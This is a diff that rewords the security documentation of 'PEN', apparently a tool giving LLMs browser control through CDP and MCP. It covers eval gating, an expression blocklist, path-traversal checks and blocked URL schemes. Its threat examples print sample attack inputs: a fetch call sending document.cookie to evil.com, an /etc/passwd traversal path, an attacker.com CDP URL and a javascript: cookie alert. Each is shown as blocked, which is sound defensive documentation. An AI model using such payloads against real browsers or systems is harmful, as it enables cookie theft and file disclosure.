@@ -1,6 +1,6 @@
 # Security
 
-PEN sits at the intersection of CDP (full browser control), MCP (LLM-driven tool execution), and the local file system. Each boundary is hardened.
+PEN sits between CDP (full browser control), MCP (LLM-driven tool calls), and the local filesystem. Every boundary is locked down.
 
 ## Overview
 
@@ -12,17 +12,17 @@ PEN sits at the intersection of CDP (full browser control), MCP (LLM-driven tool
 | PEN → File System | Temp files, path traversal           | Temp dir isolation, path checks                    |
 | PEN → Network     | Source map fetching                  | Not implemented (by design)                        |
 
-An LLM connected via MCP can call any registered PEN tool with arbitrary parameters. The gates below prevent misuse.
+Any LLM connected over MCP can call any registered tool with whatever parameters it wants. The gates below stop misuse.
 
 ## Gate 1: Eval Gating
 
-`pen_evaluate` is the most dangerous tool — it executes JavaScript in the browser.
+`pen_evaluate` is the scariest tool — it runs JS straight in the browser.
 
-**Default: disabled.** The tool is only registered if `--allow-eval` is passed at startup. Without it, the tool doesn't appear in `tools/list` and cannot be called.
+**Off by default.** It only exists if you pass `--allow-eval` at startup. Without that flag, the tool never shows up in `tools/list` and can’t be called.
 
 ## Gate 2: Expression Blocklist
 
-Even with `--allow-eval`, PEN blocks dangerous patterns:
+Even with `--allow-eval` on, PEN blocks known-dangerous patterns:
 
 | Pattern                | What it blocks            |
 | ---------------------- | ------------------------- |
@@ -37,13 +37,13 @@ Even with `--allow-eval`, PEN blocks dangerous patterns:
 | `Function(`            | Dynamic code execution    |
 | `import(`              | Dynamic module loading    |
 
-Additionally, Unicode escape sequences (`\uXXXX`) are rejected to prevent blocklist bypass.
+Unicode escape sequences (`\uXXXX`) are also rejected to prevent sneaking past the blocklist.
 
-> This is defense-in-depth, not a security boundary. A determined attacker can bypass regex filters. The real security is Gate 1 (not enabling eval at all).
+> This is defense-in-depth, not an airtight sandbox. A motivated attacker can dodge regex filters. The real protection is Gate 1: just don’t enable eval.
 
 ## Gate 3: Path Traversal Prevention
 
-Source tools accept file paths. `ValidateSourcePath` prevents traversal:
+Source tools accept file paths. `ValidateSourcePath` stops traversal cold:
 
 - Resolves the path to an absolute path
 - Checks it's within the project root using `filepath.Rel`
@@ -54,7 +54,7 @@ Temp files are validated separately — must be within `os.TempDir()/pen/`.
 
 ## Gate 4: CDP Localhost Restriction
 
-PEN only connects to localhost (`localhost`, `127.0.0.1`, `::1`). Any other host is rejected at startup before the MCP server starts.
+PEN only connects to localhost (`localhost`, `127.0.0.1`, `::1`). Anything else is rejected before the MCP server even starts.
 
 For remote browsers, use SSH tunneling:
 
@@ -67,22 +67,22 @@ pen --cdp-url http://localhost:9222
 
 `pen_navigate` and `pen_lighthouse` validate URLs before any action:
 
-| Blocked Scheme       | Reason                       |
-| -------------------- | ---------------------------- |
-| `javascript:`        | Arbitrary code execution     |
-| `data:`              | Can render arbitrary content |
-| `file:`              | Local file system access     |
-| `chrome:` / `about:` | Internal browser pages       |
-| `ftp:`               | Unencrypted protocol         |
-| `ws:` / `wss:`       | WebSocket connections        |
-| `blob:`              | In-memory content            |
-| `vbscript:`          | Legacy script execution      |
+| Blocked Scheme       | Why                         |
+| -------------------- | --------------------------- |
+| `javascript:`        | Code execution              |
+| `data:`              | Arbitrary content rendering |
+| `file:`              | Filesystem access           |
+| `chrome:` / `about:` | Internal browser pages      |
+| `ftp:`               | Unencrypted protocol        |
+| `ws:` / `wss:`       | WebSocket connections       |
+| `blob:`              | In-memory content           |
+| `vbscript:`          | Legacy script execution     |
 
-Only `http:` and `https:` are allowed.
+Only HTTP and HTTPS get through.
 
 ## Gate 6: Rate Limiting
 
-Heavy tools have cooldowns to prevent resource exhaustion:
+Heavy tools get cooldowns to prevent runaway resource use:
 
 | Tool                  | Cooldown |
 | --------------------- | -------- |
@@ -112,9 +112,9 @@ When using HTTP mode:
 { "expression": "fetch('https://evil.com?d=' + document.cookie)" }
 ```
 
-1. **Default:** Tool doesn't exist. MCP returns "unknown tool."
-2. **With `--allow-eval`:** Blocked by expression filter (`fetch(` pattern).
-3. **Obfuscated:** Regex may miss this — which is why Gate 1 (not enabling eval) is the real defense.
+1. **Default:** Tool doesn’t exist. MCP says "unknown tool."
+2. **With `--allow-eval`:** Blocked by the expression filter (`fetch(` pattern).
+3. **Obfuscated:** Regex might miss it — which is exactly why Gate 1 (not enabling eval) is your real line of defense.
 
 ### Path traversal via source tools
 
@@ -122,7 +122,7 @@ When using HTTP mode:
 { "urlPattern": "../../../../etc/passwd" }
 ```
 
-`ValidateSourcePath` resolves to `/etc/passwd`, checks it against the project root, rejects with "path resolves outside project root."
+`ValidateSourcePath` resolves to `/etc/passwd`, checks it against the project root, and rejects it.
 
 ### Rapid-fire heavy tool calls
 
@@ -137,7 +137,7 @@ pen_heap_snapshot → blocked (cooldown: 10s)
 pen --cdp-url ws://attacker.com:9222/devtools/browser
 ```
 
-Rejected at startup. PEN exits before the MCP server starts.
+Rejected at startup. PEN shuts down before the MCP server can even start.
 
 ### Malicious navigation
 
@@ -145,7 +145,7 @@ Rejected at startup. PEN exits before the MCP server starts.
 { "url": "javascript:alert(document.cookie)", "action": "goto" }
 ```
 
-Blocked immediately. The `javascript:` scheme is not allowed. Navigation never reaches the browser.
+Blocked immediately. `javascript:` isn’t allowed. The request never reaches Chrome.
 
 ## Security Checklist
 
